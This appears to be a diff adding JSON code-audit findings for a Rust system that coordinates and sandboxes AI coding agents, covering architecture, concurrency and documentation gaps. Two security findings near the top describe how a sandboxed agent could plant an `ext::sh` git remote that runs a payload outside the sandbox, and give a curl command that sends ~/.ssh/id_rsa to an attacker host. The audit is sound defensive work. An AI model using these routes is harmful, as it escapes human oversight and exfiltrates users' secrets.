+  "evidence": "sandbox.rs:827-832 git_profile_writable_paths returns SandboxWritablePath::directory(repo_root) — the whole worktree (including .git) — plus .git/stateful. seatbelt_profile (sandbox.rs:1300-1307) emits `(subpath \"<repo_root>\")` as file-write*, so .git/config and .git/hooks are writable. GIT_PROFILE_ALLOWED_SUBCOMMANDS (sandbox.rs:954-990) includes `remote` (line 978); `config` is excluded but `git remote add` writes remote.* keys into .git/config. apply_git_profile_env (sandbox.rs:1415-1448) sets protocol.ext.allow=never, GIT_CONFIG_GLOBAL=/dev/null and core.hooksPath only for the SANDBOXED invocation. README.md:401-403 documents the profile as opening the worktree and git internals for one git command.",
+  "description": "The per-invocation env hardening neutralizes ext transports and hooks only for that run; it does not persist. An agent can run `git remote add evil 'ext::sh -c \"<payload>\"'` inside the sandbox, writing a remote to .git/config. When the human later runs `git fetch evil`/`git pull` in their normal terminal, protocol.ext.allow defaults to user-initiated and the ext transport executes the payload with no sandbox. Because .git is writable at the seatbelt layer, this is a persistence-to-RCE path the sandbox's write-confinement is supposed to prevent.",
+  "solution": "Do not bind .git writable wholesale. Bind only the worktree minus .git, plus the specific .git subpaths git needs to mutate (objects, refs, logs, index, MERGE_*), and keep .git/config and .git/hooks read-only in the seatbelt profile. Additionally restrict the `remote` subcommand args (deny add/set-url/set-head or validate URLs against ext::/fd::/file:: transports), or run git with a synthesized read-only --git-dir config for write-bearing operations.",
+  "sources": [
+   "security-trust"
+  ]
+ },
+ {
+  "title": "Sandbox profiles allow reading every host file plus full network egress; 'raw Bash is denied' provides write-confinement only, not containment",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "seatbelt_profile (sandbox.rs:1297-1313) hardcodes `(allow file-read*)` and, when network==Enabled, `(allow network*)`, while the inner command runs as `/bin/sh -c <arbitrary>` (sandbox.rs:1247). The Bash gate accepts `--network enabled` for ANY profile including read-only (hook.rs:470-472) with no coupling forcing read-only to disabled network. README.md:393-403,424-429 markets the gate as 'Raw Bash commands are denied' and 'the repo readable and only the listed files or directory subtrees writable.' SECURITY.md:59 lists 'protection from malicious shell commands' as out of scope.",
+  "description": "Forcing shell through `sandbox run` confines WRITES to the repo, but the profile deliberately permits reading any file the user can read and (with --network enabled, allowed on any profile) arbitrary network egress, executing an arbitrary shell command. A prompt-injected or misbehaving agent can `sandbox run --fs read-only --network enabled --command 'curl -d @~/.ssh/id_rsa https://attacker'` and exfiltrate any secret. This is consistent with SECURITY.md's non-goal, but README's framing of denying raw Bash implies containment of the agent that the mechanism does not deliver.",
+  "solution": "Make the boundary explicit in README/sandbox docs: the sandbox confines writes only; a sandbox-run agent can read any host file and, with network, exfiltrate. Tighten defaults: forbid --network enabled for the read-only profile, default network to disabled, and narrow file-read to the repo plus required system/library paths rather than file-read* so secrets outside the repo are not trivially readable.",
+  "sources": [
+   "security-trust"
+  ]
+ },
+ {
+  "title": "Session identity is unauthenticated; the no-STATEFUL_SESSION_ID fallback is last-writer-wins, so two cooperating agents in one repo can accidentally cross-attribute leases/intents",
+  "severity": "major",
+  "area": "security",
+  "evidence": "lease_acquire/lease_release take input.session_id straight from the flat JSON body gated only by the shared bearer token (server lib.rs:599-642); ownership is keyed solely on that client-supplied string (LeaseOwnerMismatch is a string match). STATEFUL_SESSION_ID is read from env (runtime.rs:16,753-758) but is never SET anywhere in this codebase — only listed in the Codex MCP env_vars passthrough (install.rs:782). When unset, read_current_session_file / read_current_session_file_for_mcp fall back to the legacy .stateful_core/runtime/session.json (runtime.rs:213-218,229-260), which write_current_session_file_for_current_stateful_session rewrites on EVERY hook event of ANY session (hook.rs:260-270 -> runtime.rs:189-194). SECURITY.md:3-4 states the core purpose is to 'reduce accidental collisions between trusted local tools.'",
+  "description": "The single shared bearer token plus a fully client-asserted session_id means lease/intent ownership is honor-system; malicious impersonation is explicitly out of scope, so that is not the break. The in-scope break is accidental: with two concurrent Codex agents in one enabled repo and no STATEFUL_SESSION_ID (the default, since nothing sets it), the shared legacy session.json is overwritten by whichever session's hook fired last, so MCP calls and intent/lease attribution get cross-wired between the two honest sessions — silently corrupting the coordination the project exists to provide for its headline use case.",
+  "solution": "Bind identity to the runtime instead of trusting the body: issue a per-session token at session_register (PID/handshake-attested) and verify it on every lease/intent/activity call. Make STATEFUL_SESSION_ID effectively mandatory — fail closed (or refuse to start a second session) when it is unset and more than one live session exists in a repo. Stop writing a single shared legacy session.json; resolve identity only from the per-session bound sessions/<id>.json file.",
+  "sources": [
+   "security-trust"
+  ]
+ },
+ {
+  "title": "Bearer token persisted to runtime files with default permissions (no 0600)",
+  "severity": "minor",
+  "area": "security",
+  "evidence": "write_global_runtime_file (runtime.rs:118-129) and write_runtime_file (runtime.rs:104-116) use plain fs::write with no mode, writing the plaintext token into ~/.stateful_core/runtime/server.json and repo-local .stateful_core/runtime/server.json. install.rs already has OpenOptionsExt/PermissionsExt machinery (install.rs:708-712,747-756) used to preserve modes for the Codex config. SECURITY.md:32-38 acknowledges the token is a trust guard, not a boundary, and that reading the working tree is out of scope.",
+  "description": "The token is written world-readable by umask default rather than 0600. Reading the working tree / another local user is explicitly out of scope, so this is largely disclaimed, but the token-at-rest exposure is broader than necessary (other local users, backups, accidental tarballs) and is a cheap hardening the docs imply (token 'stored in local runtime discovery files') without restricting. Plaintext-over-HTTP and LAN exposure are already warned about (lan.rs:215-226), and /v1/runtime/identity requires the token (server lib.rs:170).",
+  "solution": "chmod the runtime files to 0600 on write using the existing PermissionsExt pattern from install.rs, for both the global and repo-local server.json and the per-session files.",
+  "sources": [
+   "security-trust"
+  ]
+ },
+ {
+  "title": "stateful-core is a hollow domain core: live authorization policy lives in policy_service.rs and store SQL, and half the core engine is dead code",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "Core engine only checks scope membership plus three PolicyState fields no production path can set: policy_state_for_session (stateful-store/src/lib.rs:1962-1989) builds PolicyState exclusively via with_active_intent_scopes — phase stays Default::Editing, finalized stays false, expired stays false — so the deny branches finalized_session/blocked_phase/invalid_phase/expired_intent (stateful-core/src/policy.rs:179-207) are unreachable from the server; an expired intent surfaces as missing_intent. The load-bearing policy — reservation conflicts (policy_service.rs:173-201), native-edit exact-scope hardening (246-258,310-322), lease conflict/coverage (260-335), base-observation freshness (337-343,462-507) — lives in the server crate, and lease/reservation overlap semantics live in raw SQL prefix predicates (store lib.rs:1180-1182,1209-1211). These have already diverged: core directory intent authorizes writes only at depth 1..=2 (policy.rs:25,275-287) while store SQL matches unlimited depth. Docs claim a single policy engine owning 'active intent checks, scope checks, lease conflict checks' (architecture.md:319-349).",
+  "description": "The crate named as the policy core implements roughly one of the ten documented decision steps. Conflict, reservation, lease, and freshness policy are split between stateful-server (Rust) and stateful-store (SQL) with no shared predicate definitions, and the split has produced a semantic fork (depth-2 write rule vs unlimited-depth blocking rule). The dead PolicyState fields mean the core's own tests (stateful-core/tests/policy_engine.rs) exercise states that cannot occur in production, giving false confidence that phase/expiry/finalization gating exists.",
+  "solution": "Either (a) make stateful-core the real engine: define pure decision functions taking a snapshot struct (active intent incl. declared_at/expires_at/phase, finalization, overlapping leases/reservations, observations) produced by the store, and move overlap predicates out of SQL into core (store returns candidate rows, core decides) with one shared 'paths overlap' function used by both write-authorization and blocking rules; or (b) delete PolicyState.phase/finalized/expired and re-document policy_service.rs as the policy engine. Option (a) also fixes the depth-2 asymmetry by construction.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Policy branches live in the hook adapter and agent tool names live in server policy, violating the project's own adapter contract in both directions",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "Contract: 'Hooks and adapters only extract tool intent and targets, then call the policy engine. They should not implement separate policy branches' (architecture.md:341-349); 'Hook scripts are thin adapters' (implementation-contract.md:356-367); 'The state server and policy API should not encode Codex-only assumptions beyond adapter metadata' (architecture.md:28-29). Reality: hook.rs implements tool dispatch with a default-Allow fallthrough (hook.rs:406-419, `_ => Ok(HookOutcome::Allow)` at 418), a hard MCP-filesystem deny (415-417), the entire Bash/sandbox-profile rule set (442-518: per-profile write-target rules, network values, git inner-command validation), and a special-case authorization path for the benchmark subcommand (442-450). Conversely the server hardcodes agent-runtime tool names inside policy: is_native_edit_tool matches 'apply_patch'|'Edit'|'Write'|'file_change' (policy_service.rs:129-131) and keys exact-file-intent/lease hardening on them (246-258,310-322). The enumerated tool list also exists a second time as the install matcher 'Bash|apply_patch|Edit|Write|file_change|mcp__filesystem__.*' (install.rs:801,809).",
+  "description": "Bash policy never reaches /v1/authorize at all — the hook is the only gate for it — so the single-policy-entry-point claim holds only for the five file actions. The default-Allow fallthrough plus the triple-duplicated tool enumeration (install matcher vs hook dispatch vs server native-tool list) means coordination coverage silently depends on three hardcoded lists staying in sync with each agent runtime's evolving tool set; any new first-party write tool (a MultiEdit/NotebookEdit-style tool, a non-filesystem MCP write tool) bypasses coordination with no decision recorded anywhere.",
+  "solution": "Make the adapter contract honest: hooks should classify (tool_name, inputs) into an abstract action + targets and forward everything — including Bash command text and unknown tools — to /v1/authorize (the contract already lists 'bash' as an authorize action, implementation-contract.md:142-149); server policy should branch on an adapter-supplied tool class (source.tool_class = native_edit | shell | mcp_write | unknown) instead of raw tool-name strings. Default unknown WRITE-classified tools to deny-with-reason, and generate the install matcher from the same single classification table the hook dispatch uses.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Path normalization — the identity key of the whole conflict domain — is implemented four-plus times across crates",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "Verbatim copies of normalize_relative_path: stateful-core/src/policy.rs:260-273 (private fn), stateful-server/src/policy_service.rs:883-897, stateful-store/src/lib.rs:2702-2715. A fourth obfuscated re-implementation, normalized_path_is_empty (policy_service.rs:811-825), rebuilds the same segment logic using char::from(92)/char::from(47). The CLI adds independent normalizers: normalize_file_tool_target with a lexical fallback for nonexistent files (hook.rs:1253) and sandbox.rs's repo-relative validator (~sandbox.rs:511). Hard-conflict identity is 'same workspace_id + same normalized absolute path' (implementation-contract.md:206-207), so all enforcement depends on every copy normalizing identically.",
+  "description": "The core crate keeps its normalization private, so every downstream crate copied it. Because queue keys, lease overlap, intent scope matching, and hook target extraction each normalize independently, any future edit to one copy (Windows prefix handling, trailing-slash treatment, '..' clamping) silently forks the conflict domain: a lease stored under one spelling stops conflicting with an authorize call under another. This is the highest-leverage duplication because the product's correctness claim is exactly 'same path => same decision'.",
+  "solution": "Export a single path-identity module from stateful-core (normalize_relative_path, normalize_directory_path, is_empty_after_normalization, directory overlap/depth predicates) and replace all copies; add a shared property test asserting hook-extracted targets, store keys, and policy inputs round-trip through the one function.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Outbox sync is a stub: server discards event_type/payload, never materializes queued heartbeats, yet returns sync_status 'synced'",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "The only production outbox producer queues SessionHeartbeatQueued records when PostToolUse fails (hook.rs:208-216; outbox.rs:130-160). /v1/outbox/sync persists only outbox_id/session_id/sequence (append_outbox INSERTs just those columns, store lib.rs:786-803) and echoes the client-supplied event_type/payload back in a 200 labeled 'sync_status':'synced' (server lib.rs:863-904). No event is appended, no heartbeat materialization (refresh of lease/intent/activity TTLs, lib.rs:2473-2486) occurs. Docs present the outbox as idempotent ordered evidence sync (implementation-contract.md:385-407; state-model.md:549,554-573 'Heartbeat, finalization, and observer events may be queued', outbox 'can never extend leases'). The elaborate client machinery (per-stem monotonic sequences, mkdir locks, claim/rename recovery, at-least-once replay, outbox.rs:39-477) delivers records whose entire payload is dropped on arrival.",
+  "description": "The documented idempotent, ordered, evidence-preserving sync exists only as bookkeeping of ids. Of the three state surfaces (global state.db, per-repo runtime files, outbox JSONL), the outbox is structurally write-only: payloads are discarded while the response claims 'synced', so offline heartbeat evidence is silently lost and the at-least-once client design gains nothing. For the concurrency lens this is accidentally safe (stale heartbeats can't resurrect expired leases), but it satisfies the invariant by doing nothing — and any future implementer who makes sync materialize events would reintroduce exactly the stale-replay-over-fresher-state hazard the stub avoids, with no test or doc marking the boundary. The audit trail silently omits exactly the degraded-availability windows the outbox was designed to cover.",
+  "solution": "Persist event_type/payload in the outbox table and, for recognized types (SessionHeartbeatQueued), append the corresponding event through Store::append keyed idempotently (event_id = outbox_id) so materialization runs while preserving the never-extends-leases rule by construction. If deliberate, change the response to sync_status:'recorded'/'acknowledged_discarded' and document in implementation-contract.md:383-407 and state-model.md:554-573 that v1 outbox sync is audit-only and intentionally never replays into materialized state.",
+  "sources": [
+   "concurrency",
+   "architecture",
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "stateful-cli is a god-crate: eight unrelated subsystems, a hand-rolled HTTP client, and benchmark plumbing wired into the production policy gate",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "Single crate contains hook gating (hook.rs ~1547 lines), OS sandbox (sandbox.rs ~2134), runtime discovery + a hand-written HTTP/1.1 client over TcpStream (runtime.rs ~1007, raw client at 427-463), outbox queue with its own lock protocol (outbox.rs ~801), LAN join (lan.rs ~262), Codex config installer (install.rs ~880), git porcelain (commit.rs ~604 + push.rs ~206), Codex wrapper (codex_wrapper.rs ~159), benchmark sandbox glue (codex_benchmark.rs ~369) — ~10.6k src lines plus ~9.9k test lines. The PreToolUse Bash gate special-cases the benchmark subcommand inline (hook.rs:442-450 -> authorize_nested_codex_benchmark_sandbox_bash). Tests hand-spawn fake TCP servers because nothing is injectable (tests/outbox.rs:25-35, tests/server_lifecycle.rs:540-552, tests/runtime.rs:291+); the one injectable lifecycle variant ensure_server_with has different semantics from production (skips retire, server_lifecycle.rs:39-64 vs 66-117).",
+  "description": "Every concern transitively couples to the hook hot path: a change to LAN join, the outbox lock, or the benchmark wrapper rebuilds and risks the PreToolUse gate. The hand-rolled HTTP client (no connect timeout, no chunked encoding) is reimplemented infra a client crate boundary would isolate and test once. Benchmark-only code reachable from the production Bash authorization path is the clearest sign of the boundary's absence.",
+  "solution": "Split into stateful-client (runtime discovery, HTTP transport behind a trait, outbox), stateful-hooks (event handling + dispatch), stateful-sandbox (profiles + parsers), keeping stateful-cli as a thin clap shell. Move codex_benchmark.rs into stateful-bench and gate its hook authorization branch behind a cargo feature so production builds cannot route Bash through benchmark code paths.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Agent-runtime abstraction is a one-method stub named for a different runtime than the docs claim; 'agent-runtime generic' is structurally false",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "The only runtime abstraction is `trait RuntimeAdapter { fn stateful_session_id(...) }` with a single hardwired impl literally named ClaudeCodeRuntimeAdapter and a non-configurable selector (hook.rs:61-78). Everything else is hardcoded: hook stdout uses Claude Code's hookSpecificOutput/permissionDecision schema (hook.rs:81-92); install.rs writes Claude Code-shaped hook lifecycle config ([[hooks.SessionStart]] matcher startup|resume|clear|compact, PreToolUse matcher Bash|apply_patch|Edit|Write|file_change|mcp__filesystem__.*, statusMessage fields) into ~/.codex/config.toml via a bespoke line-based TOML editor (install.rs:765-831); server policy matches the same mixed tool vocabulary (policy_service.rs:129-131); doctor checks a legacy .codex/hooks.json nothing writes anymore and counts it toward 'installed' (cli lib.rs:934,949). Docs assert 'The project is agent-runtime generic... should not encode Codex-only assumptions beyond adapter metadata' (architecture.md:27-29) while citing OpenAI Codex hook docs (current-state-coordination.md:800-806).",
+  "description": "Adopting Claude Code or Cursor today requires forking the config installer (Codex-TOML-specific), the hook dispatch tables, the matcher list, the output encoder, and the server's native-tool constants. The internal naming contradiction (a ClaudeCodeRuntimeAdapter inside the 'Codex' integration, with Edit/Write — Claude Code tools — and apply_patch — a Codex tool — in one matcher) shows the runtime contract was transplanted rather than abstracted, and makes it ambiguous which runtime's hook semantics are targeted.",
+  "solution": "Promote RuntimeAdapter to own the full per-runtime contract: hook input deserialization, session-id extraction, tool->(action,targets,tool_class) classification, decision->stdout encoding, and config installation (one installer per runtime). Select the adapter by hook subcommand or env. Move tool-name knowledge out of the server entirely so a new runtime is a new adapter impl plus zero server changes.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Protocol envelope debt: 5 enveloped routes vs 12 flat mutating routes (incl. full lease lifecycle), with a fabricated observed_at constant and non-idempotent request_id",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "require_v1_envelope is applied only to /v1/authorize and /v1/intent/{declare,request,claim,cancel} (protocol.rs:13-18; handlers lib.rs:221-300). The route table (lib.rs:53-77) leaves lease/acquire, lease/release, activity/observe, activity/finalize, session/register, session/heartbeat, reconcile/ack, notifications/poll, resume/next, outbox/sync on ad-hoc flat JSON with no protocol_version or actor/source metadata. Lease acquire/release and activity finalize directly create and destroy write authority. observed_at is a hardcoded constant on every enveloped request — the CLI fills it with ServerRuntime.started_at = '2026-05-31T00:00:00Z' (runtime.rs:93,706); outbox records likewise hardcode created_at (outbox.rs:150). Server-side TTL math never uses client observed_at (all expiry uses now_timestamp(), store lib.rs:2801-2846). The envelope-level request_id has no idempotency semantics on /v1/authorize. The contract's promised decision shape (conflicts[], context_items[], audit_event, architecture.md:331-340) is unimplemented: Decision has only decision/reason_code/message/required_next_action (stateful-core/src/types.rs:131-137). Docs acknowledge the split (implementation-contract.md:133-138).",
+  "description": "The version boundary protects the wrong half of the API: an incompatible client can still acquire/release leases and finalize sessions — the operations that grant and revoke write authority — with un-versioned bodies, so 'major mismatch fails closed' is unenforceable exactly where it matters. Every client maintains two serialization dialects, and the envelope's identity/time fields being fake means the migration bought no auditability — just schema weight. The fabricated observed_at also poisons any future use (audit ordering, drift detection, OCC) and makes recorded evidence misleading. Retrofitting versioning gets harder with each new flat route.",
+  "solution": "One migration: accept both enveloped and flat bodies on all mutating routes for a deprecation window (an extractor that tries envelope first), emit a warning field on flat usage, then enforce. Make observed_at real (clock at call time, runtime.rs:700-710) and real timestamps in outbox records, or delete observed_at from the envelope; define envelope request_id as the idempotency key for every mutating route (reuse the wait_queue.request_id partial-unique-index pattern). Either implement Decision.conflicts[]/audit_event or strike them from architecture.md.",
+  "sources": [
+   "architecture",
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Test suite has zero true-concurrency, crash-recovery, or clock tests; time is not injectable anywhere",
+  "severity": "major",
+  "area": "concurrency",
+  "evidence": "All thread::spawn in tests are single-threaded fake HTTP stubs (tests/outbox.rs:25-35; tests/server_lifecycle.rs:540-552; tests/runtime.rs:291+). The only test named 'concurrent' issues strictly sequential oneshot requests (stateful-server/tests/routes.rs:1957+). Expiry behavior is tested by raw SQL UPDATE of expires_at strings (stateful-store/tests/event_store.rs:798,842-857) because now_timestamp() is hardwired to OffsetDateTime::now_utc() with no Clock seam (store lib.rs:2801-2846; timestamp_after at 2805 silently falls back to now). No test covers: parallel requests racing the Arc<Mutex<Store>>; a second process opening the DB (install-while-serving); crash between autocommit statements of release+promote (lib.rs:979-1026) or claim_intent's claim->append->acquire triple (policy_service.rs:608-639); mutex poisoning (every handler 500s forever after one panic, server lib.rs:108); or lexicographic timestamp ordering with malformed rows. No background task exists (no tokio::spawn in stateful-server/src), so expiry/promotion liveness is traffic-dependent and untested.",
+  "description": "For a coordination layer whose product is correctness under concurrent access, the ~27k lines of tests validate sequential request/response behavior almost exclusively. The three riskiest mechanisms — non-transactional multi-statement mutations, lazy time-driven expiry, cross-process file/DB access — are exactly the ones the suite cannot exercise, because the architecture provides no seams (no Clock trait, no transaction API, no injectable transport in most paths).",
+  "solution": "Add a Clock trait (or fn()->OffsetDateTime field) to Store and ServerConfig so TTL caps, heartbeat monotonicity, and reservation expiry are unit-testable without SQL surgery; expose a Store::transaction wrapper and convert release/claim/cancel flows, then add kill-mid-sequence tests (spawn process, SIGKILL between statements via fault-injection hook); add a multi-threaded stress test driving N tokio tasks through build_router against a file-backed store; make timestamp_after return an error instead of substituting now.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "LAN cross-machine join ships in v1 despite cross-machine coordination being a declared non-goal, without any of the deferred hardening",
+  "severity": "major",
+  "area": "architecture",
+  "evidence": "Docs: 'V1 is local-only... Team-shared, cross-machine, or hosted synchronization is a later v1.5/v2 concern' (architecture.md:24-26); 'Still Out Of Scope: Team-shared state sync, Cross-machine coordination' (v1-hardening-scope-decisions.md:219-221). Code: `stateful server join` plus server-start output that auto-detects LAN addresses (UDP connect to 8.8.8.8, lan.rs:247-262) and prints copy-paste join commands embedding the bearer token over plain http (lan.rs:238-245, format_server_join_command). Joined-remote runtimes introduce a pid==0 state that complicates the lifecycle layer (server_lifecycle.rs:250-257: unreachable remote preserves server.json and refuses local takeover, hard-failing every hook).",
+  "description": "A stated non-goal quietly invalidated in the inverse direction: the scope doc defers cross-machine sync precisely because it needs hardening (auth, transport security, conflict semantics across clocks), yet the feature exists now with a single shared plaintext token over HTTP, a fake observed_at timestamp, and a failure mode where a vanished remote bricks all hooks locally. Architecturally it forces multi-machine concerns (remote pids, last-writer-wins server.json) into code paths every local-only user runs.",
+  "solution": "Either move `server join`/LAN broadcasting behind an experimental cargo feature + explicit --experimental-lan flag and update the scope docs to admit it exists, or remove it from v1 and keep the remote-runtime (pid==0) handling out of the core lifecycle. If kept: stop printing tokens in join commands by default (require explicit --show-token) and add a local fallback path so hooks degrade per the documented availability policy instead of erroring when the remote is gone.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Dead and vestigial surfaces: orphan crate, unused protocol vocabulary, phantom doctor checks",
+  "severity": "minor",
+  "area": "architecture",
+  "evidence": "(1) crates/stateful-validation/ exists with an empty src/, is absent from workspace members (Cargo.toml), and is referenced only by a plan doc (docs/superpowers/plans/2026-06-04-v1-hardening-implementation.md:62). (3) ActionKind, Target, TargetOperation, ResourceType are exported from stateful-core (src/lib.rs:15-16) and used nowhere outside types.rs. (5) doctor counts a .codex/hooks.json file toward 'installed' that no current code writes (cli lib.rs:934,949), and reports a per-repo .stateful_core/state.db (lib.rs:900-902,942) the live system never opens — the server uses only the global DB (lib.rs:883).",
+  "description": "Each item is small, but together with the never-read config.yml keys, the misnamed audit query, and the never-populated columns (reported separately) they form a misleading shell around the real system: exported types implying a richer protocol than exists, and a health check that can report installed/state-present based on artifacts from previous iterations. For a project whose docs lean on precision, the gap between visible surface and live surface is itself a defect.",
+  "solution": "Delete the orphan crate directory (recreate when the plan lands); remove unused core type exports; drop hooks.json and per-repo state.db from doctor or label them 'legacy artifact detected'.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Security-sensitive shell parsing and sandbox-profile validation are duplicated between the hook gate and the sandbox executor",
+  "severity": "minor",
+  "area": "architecture",
+  "evidence": "Two near-identical quote-state scanners: reject_outer_shell_syntax with enum QuoteState (hook.rs:880-925, enum at 55-59) vs reject_git_profile_shell_syntax with enum ShellQuoteState (sandbox.rs:992-1031, enum at ~1089), plus parallel word splitters (hook.rs:928+ split_simple_command_words vs sandbox.rs:1033+ split_git_profile_command_words). The hook re-implements per-profile invariants (read-only rejects write targets, build rejects explicit targets, git rejects overrides — hook.rs:462-515) that sandbox run re-validates at exec time. Only the git inner-command parse is shared (hook.rs:10 imports parse_git_profile_command). Separately, the five handle_*_in_repo functions copy-paste the identical repo-gate -> ensure_server -> discover_runtime -> remember_current_session preamble five times (hook.rs:144-258).",
+  "description": "The gate (PreToolUse) and the executor (sandbox run) parse the same command string with two independently-maintained parsers; the project's own top risk is parse-vs-exec mismatch, and duplicating the parser doubles the drift surface. The duplication is fail-closed today (executor re-checks), but a rule added to only one side either silently relaxes the gate or produces allow-then-fail confusion. The 5x preamble is maintenance noise where a missed edit changes gating behavior for one event type only.",
+  "solution": "Extract one shell-wrapper parsing/validation module (scanner, splitter, per-profile invariants) consumed by both the hook gate and the executor, with table-driven profile rules. Collapse the five hook preambles into a single with_enabled_repo(input, |repo_root, runtime, identity| ...) helper.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Global server.json has two unsynchronized writers: foreground server start bypasses the start lock that ensure_server relies on",
+  "severity": "minor",
+  "area": "concurrency",
+  "evidence": "ensure_server serializes startup via runtime/server.lock with double-checked health (server_lifecycle.rs:66-117, lock at 418-449), but run_server (the `server start --foreground` path) writes the global runtime file immediately after binding with no lock acquisition (cli lib.rs:887-889 write_global_runtime_file). write_global_runtime_file is a plain fs::write with no tmp+rename (runtime.rs:118-129), and read failures of a half-written file are treated as 'no runtime' (server_lifecycle.rs read_runtime_file tolerance).",
+  "description": "Discovery (env > global server.json > repo-local) has a single registry file but two writers with different protocols: a manually started foreground server on another port can clobber server.json while ensure_server holds the lock or while a healthy server is already registered — last writer wins and all hooks silently re-route. Combined with non-atomic writes, a reader can observe a torn file and trigger a spurious local spawn.",
+  "solution": "Make run_server acquire the same StartLock before writing server.json (refusing or warning if a different healthy runtime is registered), and switch all server.json writes to tmp+rename.",
+  "sources": [
+   "architecture"
+  ]
+ },
+ {
+  "title": "Phase/finalized/expired policy states are unreachable: documented deny rules for blocked phase, finalized session, and expired intent are dead code",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "Docs state phase-gated authorization as live v1 policy: state-model.md:502-505 ('Intent is write-authorizing only when status = active, expires_at > now, the session is not finalized, and phase is exploring, editing, or testing'), current-state-coordination.md:670 ('supported write action + blocked phase or finalized session -> deny') and :712 ('heartbeat extension: allowed only for active exploring/editing/testing work'), architecture.md:415-416. Implementation: policy_state_for_session returns PolicyState::default().with_active_intent_scopes(scopes) — never sets phase/finalized/expired (default is phase=Editing, finalized=false, expired=false; stateful-core/src/policy.rs:97-106; store lib.rs:1962-1989). No table stores a phase; refresh_session_state extends every active intent on heartbeat with no phase condition (store lib.rs:2422-2456). The engine branches finalized_session/blocked_phase/invalid_phase/expired_intent (policy.rs:179-207) are unreachable from the server; an expired intent surfaces as missing_intent because the row is flipped to status='expired' by expire_stale (lib.rs:2029-2033) before policy_state_for_session reads only status='active' rows.",
+  "description": "A whole tier of the documented freshness/authorization model (activity phase, session finalization state, distinct expired-intent denial, phase-gated heartbeat extension) exists only in docs and in pure-core test fixtures (stateful-core/tests/policy_engine.rs constructs states production never produces). Net behavior is still fail-closed (missing_intent), but reason codes diverge from the documented contract and the promise that a 'blocked' phase stops write authorization while keeping the activity visible is not implementable today because phase is never persisted.",
+  "solution": "Either (a) implement phase: persist phase on activities/intents, have policy_state_for_session populate phase/finalized/expired (e.g., select the most recent non-expired intent regardless of status and set expired=true when status='expired', set finalized from completed intents/finalized activities), and gate refresh_session_state's intent extension on phase; or (b) cut the doc claims: rewrite state-model.md:502-505, current-state-coordination.md:670/:712-715, and architecture.md:415-416 to describe the shipped rule (active unexpired intent + scope + lease; expired intent denies as missing_intent), and mark phase gating as target model like overrides already are.",
+  "sources": [
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "claim_intent + single-active-intent replace semantics silently destroy prior scope, making the documented edit->test loop self-destructive",
+  "severity": "critical",
+  "area": "ergonomics",
+  "evidence": "Store materialize supersedes ALL active intents per (session, workspace) on every IntentDeclared (store lib.rs:2497-2501). claim_intent appends a fresh IntentDeclared containing only the reserved scope (policy_service.rs:618-636), so claiming a reservation wipes the session's broader scope. Native edits require exact per-path file intent (policy_service.rs:246-258); sandbox build requires write_directory 'tmp/' scope (sandbox.rs:235-280 + stateful-core/src/policy.rs:30-33). SKILL.md instructs declaring exact file intent for edits (SKILL.md:12-16) and separately declaring 'tmp/' directory intent for build/test (SKILL.md:17,60-67) as independent steps with no warning they annihilate each other. The replace-not-append rule is documented only for explicit declarations (state-model.md:241-243; README.md:295-296), and claim is documented as additive ('The claim creates write-authorizing intent and the active same-session lease', current-state-coordination.md:163-164; README.md:301-303; implementation-contract.md:120-122; state-model.md:328-331). Orphaned leases survive redeclaration and are heartbeat-extended every PostToolUse (store lib.rs:2401-2410).",
+  "description": "Because each declaration replaces the session's whole scope and only one intent can be active, the canonical workflow (edit files -> run tests -> edit again) forces a scope wipe at every phase switch: declaring 'tmp/' for --fs build destroys all file intents (next Edit denies scope_mismatch), and redeclaring files destroys 'tmp/' (next sandbox run refuses target authorization). The only stable strategy — redeclare the full union [fileA, fileB, ..., 'tmp/'] every time — is documented nowhere; SKILL presents the two declarations as independent. The deny message 'Declare exact file intent for every affected path' reads to a literal agent as 'declare THIS file', wiping the rest and producing a declare->deny->declare ping-pong. Claiming a queued reservation mid-refactor silently destroys the union too, and the docs describe claim only as additive, with recovery (redeclare the complete set) described only for declare — a correctness trap exactly in the workflow the queue feature is designed for. Meanwhile a forgotten file's lease stays active and heartbeat-extended, blocking other sessions with no backing intent.",
+  "solution": "Make intent scope additive within a session (declare appends; add explicit state.intent.replace/state.intent.retract for narrowing), or allow multiple concurrent named intents. At minimum: (a) have claim_intent MERGE the claimed scope into the existing active intent instead of superseding it; (b) include the session's current full scope set in every scope_mismatch deny so the agent can redeclare the union; (c) add an explicit SKILL.md warning + union example for the edit+test loop; (d) document the replacement behavior of claim in README/implementation-contract.md/state-model.md:328-334/current-state-coordination.md:163-166.",
+  "sources": [
+   "ergonomics",
+   "spec-gap"
+  ]
+ },
+ {
+  "title": "Multi-resource atomic all-or-nothing reservation is normative in two docs but unimplemented; rename/move cannot queue at all",
+  "severity": "major",
+  "area": "spec-gap",
+  "evidence": "implementation-contract.md:209-211 'A request is reservable only when all requested resources are available. The server must not partially reserve a multi-resource request.' and :222-224; current-state-coordination.md:145-150 'V1 reservation is atomic all-or-nothing'. Neither carries an implementation-status caveat; only state-model.md:320-323 admits 'The current implementation handles one requested path per wait request.' Implementation: RequestIntentInput has a single path (policy_service.rs:61-72) and request_intent rejects all but write_file|write_directory (:652); authorize-side queueing is disabled for multi-path actions — is_multi_path_action excludes rename_file/move_file from enqueue (policy_service.rs:113-115,262-265), so the one genuinely multi-resource action gets a bare deny with no waiting mechanism.",
